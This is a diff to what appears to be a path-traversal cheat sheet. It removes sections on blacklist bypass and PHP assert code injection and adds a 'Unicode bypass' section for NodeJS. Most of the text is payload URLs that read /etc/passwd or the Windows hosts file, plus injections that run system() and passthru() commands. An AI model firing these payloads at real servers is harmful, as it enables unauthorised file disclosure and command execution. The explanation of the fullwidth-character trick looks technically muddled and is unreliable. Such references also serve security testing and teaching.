@@ -36,32 +36,10 @@ if(substr($_GET['file'], -6, 6) != "passwd"){
 `?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`  
 `?file=%252e/%252e/%252e/%252e/%252e/etc/passwd`  
 
-### Extension blacklist bypass
-Extension blacklisting can be bypassed with path normalization technique. By adding nonexisting directory as an argument prefix and normalization string in the end of parameter. Normalization string for linux is '/.' and './' on windows servers.  
-
-```php
-<?php
-# PHP files are not allowed
-if (substr($_GET['file'], -4, 4) != '.php')
-   echo file_get_contents($_GET['file']);
-else
-   echo 'You are not allowed to see php source files!'."\n";
-?>
-```
-
-`http://linux_server/site.php?file=nonexisting../../../../../../../../var/www/html/test.php/.`  
-`http://windows_server/site.php?file=nonexisting..\..\..\..\..\..\..\..\wamp\web\test.php./`
-
-### Assert code injection
-If sanitization is done using assert function, injection arbitrary code could be possible.    
-```php
-<?php
-    $file = $_GET['file'];
-    assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
-?>
-```
-`http://server/site.php?file=%27.system(%22ls%22).%27`  
-`http://server/site.php?file=%27.passthru%28%22ls%22%29.%27`
+Unicode bypass  
+NodeJS path handling libraries are internally stripping \xFF. By placing a Ｎ character (full width latin N) or (U+FF2E), since FF is stripped, what remains is 2E - url decoded '.' (dot)  
+`?file=ＮＮ/ＮＮ/ＮＮ/ＮＮ/ＮＮ/etc/passwd`  
+`?file=ＮＮ\ＮＮ\ＮＮ\ＮＮ\ＮＮ\Windows\System32\drivers\etc\hosts`  
 
 ### Nullbyte injection 
 When '.php' is appended, it can be bypassed with nullbyte in php versions before 5.3.4, or if 'magic_quotes_gpc' is set to Off.  
